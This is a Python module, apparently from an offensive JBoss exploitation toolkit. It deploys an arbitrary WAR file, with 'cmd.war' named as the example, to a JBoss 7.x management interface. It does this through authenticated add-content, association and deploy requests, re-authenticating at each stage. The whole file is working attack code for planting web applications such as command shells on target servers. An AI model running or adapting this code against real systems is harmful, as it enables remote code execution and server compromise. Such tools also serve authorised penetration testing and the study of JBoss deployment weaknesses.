from src.platform.jboss.interfaces import JINTERFACES
from src.platform.jboss.authenticate import checkAuth
from src.module.deploy_utils import parse_war_path
from os.path import abspath
from log import LOG
import utility

versions = ["7.0", "7.1"]
title = JINTERFACES.MM
def deploy(fingerengine, fingerprint):
    """ Deploying WARs to JBoss 7.x is a three stage process.  The first stage
    is a POST request with the file data to /management/add-content.  This places
    the data on the server and passes back a hash to reference it.  The second
    stage is an association of this data with a WAR file name, i.e. cmd.war.
    The final stage is to enable the WAR, which is a simple JSON request with the
    deploy operation.
    """

    war_file = abspath(fingerengine.options.deploy)
    war_name = parse_war_path(war_file)
    war_raw = war_file.rsplit('/', 1)[1]
    utility.Msg("Preparing to deploy {0}...".format(war_file))

    base = "http://{0}:{1}/management".format(fingerengine.options.ip,
                                              fingerprint.port)
    add_content = "/add-content"
    association = '{{"address":[{{"deployment":"{0}"}}],"operation":"add",'\
                  '"runtime-name":"{2}","content":[{{"hash":{{"BYTES_VALUE"'\
                  ':"{1}"}}}}],"name":"{0}"}}'
    deploy = '{{"operation":"deploy", "address":{{"deployment":"{0}"}}}}'
    headers = {"Content-Type":"application/json"}

    try:
        fwar = {war_file : open(war_file, "r").read()}
    except:
        utility.Msg("Failed to open WAR (%s)" % war_file, LOG.ERROR)
        return

    # first we POST the WAR to add-content
    response = utility.requests_post(base + add_content, files=fwar)
    if response.status_code == 401:
        response = redo_auth(fingerengine, fingerprint, base + add_content, 
                             files=fwar)

    if response.status_code != 200:
        utility.Msg("Failed to POST data (HTTP %d)" % response.status_code, LOG.ERROR)
        return

    # fetch our BYTES_VALUE
    if response.json()['outcome'] != 'success':
        utility.Msg("Failed to POST data", LOG.ERROR)
        utility.Msg(response.json(), LOG.DEBUG)
        return

    BYTES_VALUE = response.json()['result']['BYTES_VALUE']

    # now we need to associate the bytes with a name
    response = utility.requests_post(base, 
                                data=association.format(war_name, BYTES_VALUE, war_raw),
                                headers=headers)

    if response.status_code == 401:
        response = redo_auth(fingerengine, fingerprint, base,
                            data=association.format(war_name, BYTES_VALUE, war_raw),
                            headers=headers)

    if response.status_code != 200:
        utility.Msg("Failed to associate content (HTTP %d)" % response.status_code, LOG.ERROR)
        utility.Msg(response.content, LOG.DEBUG)
        return

    # now enable the WAR
    deploy = deploy.format(war_name)

    response = utility.requests_post(base, data=deploy, headers=headers)
    if response.status_code == 401:
        response = redo_auth(fingerengine, fingerprint, base, data=deploy,
                             headers=headers)
                             
    if response.status_code != 200:
        utility.Msg("Failed to enable WAR (HTTP %d)" % response.status_code, LOG.ERROR)
        utility.Msg(response.content, LOG.DEBUG)
        return

    utility.Msg("%s deployed to %s." % (war_file, fingerengine.options.ip), 
                                        LOG.SUCCESS)


def redo_auth(fingerengine, fingerprint, url, **args):
    """ For whatever reason, we need to reauth at each stage of this process.
    It's a huge pain, and I have no idea why they thought this was a great idea.
    If you perform a deployment manually and inspect the traffic with a web
    proxy, you can see the 401's for each step.  It's ridiculous.
    """

    response = None
    utility.Msg("Host %s:%s requires auth, checking..." % 
                    (fingerengine.options.ip, fingerprint.port), LOG.DEBUG)
    cookies = checkAuth(fingerengine.options.ip, fingerprint.port,
                        fingerprint.title, fingerprint.version)

    if cookies:
        response = utility.requests_post(url, auth=cookies[1], **args)
    else:
        utility.Msg("Could not get auth for %s:%s" % 
                        (fingerengine.options.ip, fingerprint.port), LOG.ERROR)

    return response
